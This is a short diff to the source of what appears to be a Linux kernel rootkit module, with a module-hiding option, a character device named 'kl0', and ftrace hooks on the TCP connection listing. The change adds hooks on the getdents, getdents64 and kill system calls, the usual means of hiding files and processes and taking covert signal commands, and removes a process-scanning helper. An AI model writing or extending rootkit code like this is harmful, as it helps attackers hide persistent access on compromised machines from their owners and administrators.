@@ -11,6 +11,7 @@
 #include <linux/namei.h>
 #include <linux/tcp.h>
 #include "ftrace_helper.h"
+#include "hooks.c"
 
 #ifdef HIDE_MODULE
 #include <linux/list.h>
@@ -27,7 +28,6 @@ MODULE_LICENSE("GPL");
 #define DEVICE_NAME "kl0"
 unsigned major;
 
-static int target_pid = 0;
 static char* target_process = "/home/vagrant/test"
 
 #ifndef BUFLEN
@@ -165,21 +165,10 @@ static inline void unprotect_memory(void)
 
 static struct ftrace_hook hooks[] = {
 	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
+	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 };
-
-static void check_process(char* comm, int pid) {
-	if (strcmp(comm, target_process) == 0){
-		target_pid = pid;
-	}
-	pr_info("%s [%d]\n", comm, pid);
-}
-
-static int get_pid(struct subprocess_info *info, struct cred *new) {
-	struct task_struct *task;
-
-    for_each_process(task)
-        check_process(task->comm, task->pid);
-}
 
 static int spawnProcess(char* path) {
 
